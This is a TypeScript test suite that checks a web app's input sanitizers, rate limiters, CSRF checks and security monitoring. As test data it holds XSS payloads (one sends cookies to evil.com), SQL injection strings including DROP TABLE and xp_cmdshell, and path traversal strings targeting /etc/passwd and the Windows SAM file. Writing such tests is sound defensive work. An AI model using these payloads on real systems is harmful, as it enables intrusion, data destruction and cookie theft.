// Comprehensive Security Attack Scenarios Test Suite
import { SecurityUtils, SecurityMonitor } from '../utils/security';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import React from 'react';

// Mock components for testing
const MockContactForm: React.FC<{ onSubmit: (data: any) => void }> = ({ onSubmit }) => {
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const formData = new FormData(e.target as HTMLFormElement);
    const data = Object.fromEntries(formData.entries());
    onSubmit(data);
  };

  return React.createElement('form', {
    onSubmit: handleSubmit,
    'data-testid': 'contact-form'
  }, [
    React.createElement('input', {
      key: 'name',
      name: 'name',
      placeholder: 'Name',
      'data-testid': 'name-input'
    }),
    React.createElement('input', {
      key: 'email',
      name: 'email',
      placeholder: 'Email',
      'data-testid': 'email-input'
    }),
    React.createElement('textarea', {
      key: 'message',
      name: 'message',
      placeholder: 'Message',
      'data-testid': 'message-input'
    }),
    React.createElement('button', {
      key: 'submit',
      type: 'submit',
      'data-testid': 'submit-button'
    }, 'Submit')
  ]);
};

const MockChatBot: React.FC<{ onMessage: (message: string) => string }> = ({ onMessage }) => {
  const [message, setMessage] = React.useState('');
  const [response, setResponse] = React.useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const botResponse = onMessage(message);
    setResponse(botResponse);
  };

  return React.createElement('div', {}, [
    React.createElement('form', {
      key: 'form',
      onSubmit: handleSubmit
    }, [
      React.createElement('input', {
        key: 'input',
        value: message,
        onChange: (e: React.ChangeEvent<HTMLInputElement>) => setMessage(e.target.value),
        'data-testid': 'chat-input',
        placeholder: 'Type your message...'
      }),
      React.createElement('button', {
        key: 'button',
        type: 'submit',
        'data-testid': 'chat-submit'
      }, 'Send')
    ]),
    React.createElement('div', {
      key: 'response',
      'data-testid': 'chat-response'
    }, response)
  ]);
};

describe('🚨 Cybersecurity Attack Scenarios', () => {
  beforeEach(() => {
    SecurityMonitor.clearEvents();
    // Reset any global state
    jest.clearAllMocks();
  });

  describe('🎯 Cross-Site Scripting (XSS) Attacks', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<svg onload="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      '<select onfocus="alert(\'XSS\')" autofocus>',
      '<textarea onfocus="alert(\'XSS\')" autofocus>',
      '<keygen onfocus="alert(\'XSS\')" autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src="x" onerror="alert(\'XSS\')">',
      '<details open ontoggle="alert(\'XSS\')">',
      '<marquee onstart="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>'
    ];

    test.each(xssPayloads)('should prevent XSS attack: %s', (payload) => {
      const sanitized = SecurityUtils.sanitizeHtml(payload);
      
      // Should not contain script tags or event handlers
      expect(sanitized).not.toMatch(/<script/i);
      expect(sanitized).not.toMatch(/javascript:/i);
      expect(sanitized).not.toMatch(/on\w+=/i);
      expect(sanitized).not.toMatch(/alert/i);
      
      // Should detect as suspicious
      expect(SecurityUtils.containsSuspiciousContent(payload)).toBe(true);
    });

    test('should handle XSS in contact form', async () => {
      const user = userEvent.setup();
      const mockSubmit = jest.fn();
      
      render(<MockContactForm onSubmit={mockSubmit} />);
      
      const maliciousInput = '<script>alert("Stealing data!")</script>Innocent message';
      
      await user.type(screen.getByTestId('name-input'), 'John Doe');
      await user.type(screen.getByTestId('email-input'), 'john@example.com');
      await user.type(screen.getByTestId('message-input'), maliciousInput);
      await user.click(screen.getByTestId('submit-button'));
      
      expect(mockSubmit).toHaveBeenCalledWith({
        name: 'John Doe',
        email: 'john@example.com',
        message: maliciousInput
      });
      
      // Verify the input would be caught by security utils
      const secureData = SecurityUtils.secureFormSubmit(mockSubmit.mock.calls[0][0]);
      expect(secureData.message).toBeUndefined(); // Should be filtered out
    });

    test('should prevent XSS in chat bot', async () => {
      const user = userEvent.setup();
      const mockMessageHandler = jest.fn((message: string) => {
        if (SecurityUtils.containsSuspiciousContent(message)) {
          SecurityMonitor.logEvent('xss_attempt', { message });
          return 'I cannot process that request for security reasons.';
        }
        return `You said: ${SecurityUtils.sanitizeInput(message)}`;
      });
      
      render(<MockChatBot onMessage={mockMessageHandler} />);
      
      const xssPayload = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
      
      await user.type(screen.getByTestId('chat-input'), xssPayload);
      await user.click(screen.getByTestId('chat-submit'));
      
      await waitFor(() => {
        expect(screen.getByTestId('chat-response')).toHaveTextContent(
          'I cannot process that request for security reasons.'
        );
      });
      
      const events = SecurityMonitor.getEvents();
      expect(events).toHaveLength(1);
      expect(events[0].type).toBe('xss_attempt');
    });
  });

  describe('💉 SQL Injection Attack Scenarios', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' OR 'a'='a",
      "1' OR '1'='1' /*",
      "' OR 1=1#",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "1'; WAITFOR DELAY '00:00:05' --",
      "' OR (SELECT user FROM mysql.user WHERE user='root') = 'root",
      "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
    ];

    test.each(sqlInjectionPayloads)('should detect SQL injection: %s', (payload) => {
      expect(SecurityUtils.containsSuspiciousContent(payload)).toBe(true);
      
      const sanitized = SecurityUtils.sanitizeInput(payload);
      expect(sanitized).not.toMatch(/drop\s+table/i);
      expect(sanitized).not.toMatch(/union\s+select/i);
      expect(sanitized).not.toMatch(/insert\s+into/i);
      expect(sanitized).not.toMatch(/delete\s+from/i);
    });

    test('should prevent SQL injection in search functionality', () => {
      const searchQuery = "'; DROP TABLE users; SELECT * FROM secrets WHERE '1'='1";
      
      // Simulate search input validation
      const isValidSearch = (query: string): boolean => {
        if (SecurityUtils.containsSuspiciousContent(query)) {
          SecurityMonitor.logEvent('sql_injection_attempt', { query });
          return false;
        }
        return query.length > 0 && query.length <= 100;
      };
      
      expect(isValidSearch(searchQuery)).toBe(false);
      
      const events = SecurityMonitor.getEvents();
      expect(events).toHaveLength(1);
      expect(events[0].type).toBe('sql_injection_attempt');
    });
  });

  describe('🔐 Authentication & Authorization Attacks', () => {
    test('should prevent brute force attacks with rate limiting', () => {
      const rateLimiter = SecurityUtils.createRateLimiter(3, 60000); // 3 attempts per minute
      const userIP = '192.168.1.100';
      
      // Simulate multiple login attempts
      expect(rateLimiter(userIP)).toBe(true);  // 1st attempt
      expect(rateLimiter(userIP)).toBe(true);  // 2nd attempt
      expect(rateLimiter(userIP)).toBe(true);  // 3rd attempt
      expect(rateLimiter(userIP)).toBe(false); // 4th attempt - blocked
      expect(rateLimiter(userIP)).toBe(false); // 5th attempt - blocked
      
      SecurityMonitor.logEvent('brute_force_attempt', { 
        ip: userIP, 
        attempts: 5 
      });
      
      const events = SecurityMonitor.getEvents();
      expect(events[0].type).toBe('brute_force_attempt');
    });

    test('should validate session tokens', () => {
      const validToken = SecurityUtils.generateSecureToken(32);
      const invalidTokens = [
        '',
        'short',
        'predictable123',
        '<script>alert("xss")</script>',
        'null',
        'undefined',
        '../../etc/passwd'
      ];
      
      // Valid token should be 64 characters (32 bytes in hex)
      expect(validToken).toHaveLength(64);
      expect(/^[a-f0-9]+$/i.test(validToken)).toBe(true);
      
      invalidTokens.forEach(token => {
        expect(token.length).toBeLessThan(64);
      });
    });

    test('should prevent privilege escalation', () => {
      const userRoles = ['user', 'admin', 'superuser'];
      const maliciousRoleAttempts = [
        'admin"; DROP TABLE users; --',
        'user\'; UPDATE users SET role=\'admin\' WHERE id=1; --',
        '../admin',
        'user,admin',
        'user||admin',
        'user&admin'
      ];
      
      const isValidRole = (role: string): boolean => {
        if (SecurityUtils.containsSuspiciousContent(role)) {
          SecurityMonitor.logEvent('privilege_escalation_attempt', { role });
          return false;
        }
        return userRoles.includes(role.toLowerCase().trim());
      };
      
      maliciousRoleAttempts.forEach(role => {
        expect(isValidRole(role)).toBe(false);
      });
      
      const events = SecurityMonitor.getEvents();
      expect(events.length).toBeGreaterThan(0);
      expect(events.every(e => e.type === 'privilege_escalation_attempt')).toBe(true);
    });
  });

  describe('📁 File Upload Attack Scenarios', () => {
    const maliciousFiles = [
      { name: 'virus.exe', type: 'application/x-msdownload' },
      { name: 'script.php', type: 'application/x-php' },
      { name: 'shell.jsp', type: 'application/x-jsp' },
      { name: 'backdoor.asp', type: 'application/x-asp' },
      { name: 'malware.bat', type: 'application/x-bat' },
      { name: 'trojan.scr', type: 'application/x-screensaver' },
      { name: '../../../etc/passwd', type: 'text/plain' },
      { name: 'image.jpg.exe', type: 'application/x-msdownload' },
      { name: 'document.pdf.php', type: 'application/x-php' }
    ];

    test.each(maliciousFiles)('should reject malicious file: $name', (file) => {
      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
      const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];
      
      const isValidFile = (fileName: string, fileType: string): boolean => {
        // Check file extension
        const extension = fileName.toLowerCase().substring(fileName.lastIndexOf('.'));
        if (!allowedExtensions.includes(extension)) {
          SecurityMonitor.logEvent('malicious_file_upload', { fileName, fileType, reason: 'invalid_extension' });
          return false;
        }
        
        // Check MIME type
        if (!allowedTypes.includes(fileType)) {
          SecurityMonitor.logEvent('malicious_file_upload', { fileName, fileType, reason: 'invalid_mime_type' });
          return false;
        }
        
        // Check for path traversal
        if (fileName.includes('../') || fileName.includes('..\\')) {
          SecurityMonitor.logEvent('path_traversal_attempt', { fileName });
          return false;
        }
        
        return true;
      };
      
      expect(isValidFile(file.name, file.type)).toBe(false);
    });

    test('should validate file size limits', () => {
      const maxFileSize = 5 * 1024 * 1024; // 5MB
      const oversizedFile = {
        name: 'large-image.jpg',
        size: 10 * 1024 * 1024, // 10MB
        type: 'image/jpeg'
      };
      
      const isValidFileSize = (file: { name: string; size: number; type: string }): boolean => {
        if (file.size > maxFileSize) {
          SecurityMonitor.logEvent('oversized_file_upload', { 
            fileName: file.name, 
            size: file.size, 
            maxSize: maxFileSize 
          });
          return false;
        }
        return true;
      };
      
      expect(isValidFileSize(oversizedFile)).toBe(false);
      
      const events = SecurityMonitor.getEvents();
      expect(events[0].type).toBe('oversized_file_upload');
    });
  });

  describe('🌐 Cross-Site Request Forgery (CSRF) Attacks', () => {
    test('should validate CSRF tokens', () => {
      const generateCSRFToken = (): string => SecurityUtils.generateSecureToken(32);
      const validateCSRFToken = (token: string, sessionToken: string): boolean => {
        return token === sessionToken && token.length === 64;
      };
      
      const sessionToken = generateCSRFToken();
      const validToken = sessionToken;
      const invalidTokens = [
        '',
        'invalid-token',
        SecurityUtils.generateSecureToken(32), // Different valid token
        '<script>alert("xss")</script>',
        sessionToken.substring(0, 32) // Truncated token
      ];
      
      expect(validateCSRFToken(validToken, sessionToken)).toBe(true);
      
      invalidTokens.forEach(token => {
        expect(validateCSRFToken(token, sessionToken)).toBe(false);
      });
    });

    test('should prevent CSRF in form submissions', async () => {
      const user = userEvent.setup();
      let csrfToken = SecurityUtils.generateSecureToken(32);
      
      const MockSecureForm = () => {
        const [token] = React.useState(csrfToken);
        
        const handleSubmit = (e: React.FormEvent) => {
          e.preventDefault();
          const formData = new FormData(e.target as HTMLFormElement);
          const submittedToken = formData.get('csrf_token') as string;
          
          if (submittedToken !== token) {
            SecurityMonitor.logEvent('csrf_attack_attempt', { 
              expectedToken: token, 
              receivedToken: submittedToken 
            });
            alert('CSRF token validation failed');
            return;
          }
          
          alert('Form submitted successfully');
        };
        
        return (
          <form onSubmit={handleSubmit}>
            <input type="hidden" name="csrf_token" value={token} />
            <input name="data" placeholder="Data" data-testid="data-input" />
            <button type="submit" data-testid="secure-submit">Submit</button>
          </form>
        );
      };
      
      render(<MockSecureForm />);
      
      // Simulate CSRF attack by modifying the token
      const hiddenInput = document.querySelector('input[name="csrf_token"]') as HTMLInputElement;
      hiddenInput.value = 'malicious-token';
      
      await user.type(screen.getByTestId('data-input'), 'test data');
      
      // Mock window.alert
      const alertSpy = jest.spyOn(window, 'alert').mockImplementation(() => {});
      
      await user.click(screen.getByTestId('secure-submit'));
      
      expect(alertSpy).toHaveBeenCalledWith('CSRF token validation failed');
      
      const events = SecurityMonitor.getEvents();
      expect(events[0].type).toBe('csrf_attack_attempt');
      
      alertSpy.mockRestore();
    });
  });

  describe('🔍 Information Disclosure Attacks', () => {
    test('should prevent sensitive information leakage in error messages', () => {
      const sensitiveErrors = [
        'Database connection failed: mysql://user:password@localhost:3306/db',
        'File not found: /etc/passwd',
        'SQL Error: Table \'users\' doesn\'t exist',
        'API Key: sk-1234567890abcdef',
        'JWT Secret: super-secret-key-12345'
      ];
      
      const sanitizeErrorMessage = (error: string): string => {
        // Remove sensitive patterns
        return error
          .replace(/mysql:\/\/[^@]+@[^\/]+\/\w+/g, 'Database connection failed')
          .replace(/\/etc\/\w+/g, 'System file')
          .replace(/Table '[^']+'/g, 'Table')
          .replace(/API Key: [^\s]+/g, 'API Key: [REDACTED]')
          .replace(/JWT Secret: [^\s]+/g, 'JWT Secret: [REDACTED]')
          .replace(/password[=:]\s*[^\s]+/gi, 'password: [REDACTED]');
      };
      
      sensitiveErrors.forEach(error => {
        const sanitized = sanitizeErrorMessage(error);
        expect(sanitized).not.toContain('password');
        expect(sanitized).not.toContain('mysql://');
        expect(sanitized).not.toContain('/etc/');
        expect(sanitized).not.toContain('sk-');
        expect(sanitized).not.toContain('super-secret');
      });
    });

    test('should prevent directory traversal attacks', () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
      ];
      
      const isValidPath = (path: string): boolean => {
        const decodedPath = decodeURIComponent(path);
        
        if (decodedPath.includes('../') || decodedPath.includes('..\\')) {
          SecurityMonitor.logEvent('directory_traversal_attempt', { path: decodedPath });
          return false;
        }
        
        if (decodedPath.includes('/etc/') || decodedPath.includes('\\windows\\')) {
          SecurityMonitor.logEvent('system_file_access_attempt', { path: decodedPath });
          return false;
        }
        
        return true;
      };
      
      traversalAttempts.forEach(path => {
        expect(isValidPath(path)).toBe(false);
      });
      
      const events = SecurityMonitor.getEvents();
      expect(events.length).toBeGreaterThan(0);
    });
  });

  describe('⚡ Denial of Service (DoS) Attacks', () => {
    test('should prevent resource exhaustion attacks', () => {
      const rateLimiter = SecurityUtils.createRateLimiter(10, 1000); // 10 requests per second
      const attackerIP = '192.168.1.200';
      
      let blockedRequests = 0;
      
      // Simulate rapid requests
      for (let i = 0; i < 50; i++) {
        if (!rateLimiter(attackerIP)) {
          blockedRequests++;
        }
      }
      
      expect(blockedRequests).toBeGreaterThan(30); // Most requests should be blocked
      
      SecurityMonitor.logEvent('dos_attack_detected', { 
        ip: attackerIP, 
        blockedRequests,
        totalRequests: 50
      });
      
      const events = SecurityMonitor.getEvents();
      expect(events[0].type).toBe('dos_attack_detected');
    });

    test('should prevent memory exhaustion with input limits', () => {
      const maxInputLength = 1000;
      const maliciousInputs = [
        'A'.repeat(10000),
        'B'.repeat(100000),
        'C'.repeat(1000000)
      ];
      
      maliciousInputs.forEach(input => {
        const sanitized = SecurityUtils.sanitizeInput(input, maxInputLength);
        expect(sanitized.length).toBeLessThanOrEqual(maxInputLength);
        
        if (input.length > maxInputLength * 10) {
          SecurityMonitor.logEvent('memory_exhaustion_attempt', { 
            inputLength: input.length,
            maxAllowed: maxInputLength
          });
        }
      });
    });
  });

  describe('🕵️ Advanced Persistent Threat (APT) Scenarios', () => {
    test('should detect suspicious user behavior patterns', () => {
      const userActions = [
        { action: 'login', timestamp: Date.now() },
        { action: 'view_profile', timestamp: Date.now() + 1000 },
        { action: 'attempt_admin_access', timestamp: Date.now() + 2000 },
        { action: 'download_user_list', timestamp: Date.now() + 3000 },
        { action: 'modify_permissions', timestamp: Date.now() + 4000 },
        { action: 'access_sensitive_data', timestamp: Date.now() + 5000 }
      ];
      
      const suspiciousActions = ['attempt_admin_access', 'download_user_list', 'modify_permissions', 'access_sensitive_data'];
      
      const detectSuspiciousPattern = (actions: typeof userActions): boolean => {
        const suspiciousCount = actions.filter(action => 
          suspiciousActions.includes(action.action)
        ).length;
        
        if (suspiciousCount >= 3) {
          SecurityMonitor.logEvent('apt_behavior_detected', { 
            actions: actions.map(a => a.action),
            suspiciousCount
          });
          return true;
        }
        
        return false;
      };
      
      expect(detectSuspiciousPattern(userActions)).toBe(true);
      
      const events = SecurityMonitor.getEvents();
      expect(events[0].type).toBe('apt_behavior_detected');
    });

    test('should detect data exfiltration attempts', () => {
      const dataRequests = [
        { endpoint: '/api/users', size: 1024 },
        { endpoint: '/api/users', size: 2048 },
        { endpoint: '/api/sensitive-data', size: 5120 },
        { endpoint: '/api/export-all', size: 10240 },
        { endpoint: '/api/backup', size: 20480 }
      ];
      
      const detectDataExfiltration = (requests: typeof dataRequests): boolean => {
        const totalSize = requests.reduce((sum, req) => sum + req.size, 0);
        const sensitiveEndpoints = requests.filter(req => 
          req.endpoint.includes('sensitive') || 
          req.endpoint.includes('export') || 
          req.endpoint.includes('backup')
        );
        
        if (totalSize > 15000 || sensitiveEndpoints.length > 1) {
          SecurityMonitor.logEvent('data_exfiltration_attempt', { 
            totalSize,
            sensitiveEndpoints: sensitiveEndpoints.length,
            requests: requests.map(r => r.endpoint)
          });
          return true;
        }
        
        return false;
      };
      
      expect(detectDataExfiltration(dataRequests)).toBe(true);
      
      const events = SecurityMonitor.getEvents();
      expect(events[0].type).toBe('data_exfiltration_attempt');
    });
  });

  describe('🔒 Security Headers and Configuration Tests', () => {
    test('should validate Content Security Policy', () => {
      const cspHeader = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:";
      
      const validateCSP = (csp: string): boolean => {
        const policies = csp.split(';').map(p => p.trim());
        const requiredPolicies = ['default-src', 'script-src', 'style-src', 'img-src'];
        
        return requiredPolicies.every(policy => 
          policies.some(p => p.startsWith(policy))
        );
      };
      
      expect(validateCSP(cspHeader)).toBe(true);
      
      // Test weak CSP
      const weakCSP = "default-src *; script-src *";
      expect(validateCSP(weakCSP)).toBe(false);
    });

    test('should validate secure cookie settings', () => {
      const cookieSettings = {
        httpOnly: true,
        secure: true,
        sameSite: 'strict' as const,
        maxAge: 3600
      };
      
      const validateCookieSettings = (settings: typeof cookieSettings): boolean => {
        if (!settings.httpOnly) {
          SecurityMonitor.logEvent('insecure_cookie_config', { issue: 'httpOnly_false' });
          return false;
        }
        
        if (!settings.secure) {
          SecurityMonitor.logEvent('insecure_cookie_config', { issue: 'secure_false' });
          return false;
        }
        
        if (settings.sameSite !== 'strict' && settings.sameSite !== 'lax') {
          SecurityMonitor.logEvent('insecure_cookie_config', { issue: 'weak_samesite' });
          return false;
        }
        
        return true;
      };
      
      expect(validateCookieSettings(cookieSettings)).toBe(true);
      
      // Test insecure settings
      const insecureSettings = { ...cookieSettings, httpOnly: false, secure: false };
      expect(validateCookieSettings(insecureSettings)).toBe(false);
    });
  });
});

describe('🛡️ Security Monitoring and Alerting', () => {
  beforeEach(() => {
    SecurityMonitor.clearEvents();
  });

  test('should aggregate and analyze security events', () => {
    // Simulate various security events
    const events = [
      { type: 'xss_attempt', count: 5 },
      { type: 'sql_injection_attempt', count: 3 },
      { type: 'brute_force_attempt', count: 10 },
      { type: 'csrf_attack_attempt', count: 2 },
      { type: 'directory_traversal_attempt', count: 7 }
    ];
    
    events.forEach(event => {
      for (let i = 0; i < event.count; i++) {
        SecurityMonitor.logEvent(event.type, { attempt: i + 1 });
      }
    });
    
    const allEvents = SecurityMonitor.getEvents();
    expect(allEvents).toHaveLength(27); // Total of all events
    
    // Analyze event patterns
    const eventCounts = allEvents.reduce((acc, event) => {
      acc[event.type] = (acc[event.type] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);
    
    expect(eventCounts['brute_force_attempt']).toBe(10);
    expect(eventCounts['directory_traversal_attempt']).toBe(7);
    expect(eventCounts['xss_attempt']).toBe(5);
  });

  test('should trigger alerts for critical security events', () => {
    const criticalEvents = ['apt_behavior_detected', 'data_exfiltration_attempt', 'privilege_escalation_attempt'];
    const alerts: string[] = [];
    
    const triggerAlert = (eventType: string) => {
      if (criticalEvents.includes(eventType)) {
        alerts.push(`CRITICAL ALERT: ${eventType} detected at ${new Date().toISOString()}`);
      }
    };
    
    SecurityMonitor.logEvent('apt_behavior_detected', { severity: 'critical' });
    triggerAlert('apt_behavior_detected');
    
    SecurityMonitor.logEvent('xss_attempt', { severity: 'medium' });
    triggerAlert('xss_attempt');
    
    SecurityMonitor.logEvent('data_exfiltration_attempt', { severity: 'critical' });
    triggerAlert('data_exfiltration_attempt');
    
    expect(alerts).toHaveLength(2);
    expect(alerts[0]).toContain('apt_behavior_detected');
    expect(alerts[1]).toContain('data_exfiltration_attempt');
  });
});

// Performance and Load Testing for Security
describe('⚡ Security Performance Under Load', () => {
  test('should maintain security under high load', () => {
    const startTime = Date.now();
    const iterations = 1000;
    
    for (let i = 0; i < iterations; i++) {
      const maliciousInput = `<script>alert('xss-${i}')</script>`;
      SecurityUtils.sanitizeHtml(maliciousInput);
      SecurityUtils.containsSuspiciousContent(maliciousInput);
    }
    
    const endTime = Date.now();
    const duration = endTime - startTime;
    
    // Should complete within reasonable time (less than 1 second for 1000 operations)
    expect(duration).toBeLessThan(1000);
  });

  test('should handle concurrent security validations', async () => {
    const concurrentValidations = Array.from({ length: 100 }, (_, i) => 
      Promise.resolve().then(() => {
        const input = `malicious-input-${i}<script>alert(${i})</script>`;
        return {
          index: i,
          isSuspicious: SecurityUtils.containsSuspiciousContent(input),
          sanitized: SecurityUtils.sanitizeInput(input)
        };
      })
    );
    
    const results = await Promise.all(concurrentValidations);
    
    expect(results).toHaveLength(100);
    expect(results.every(r => r.isSuspicious)).toBe(true);
    expect(results.every(r => !r.sanitized.includes('<script>'))).toBe(true);
  });
});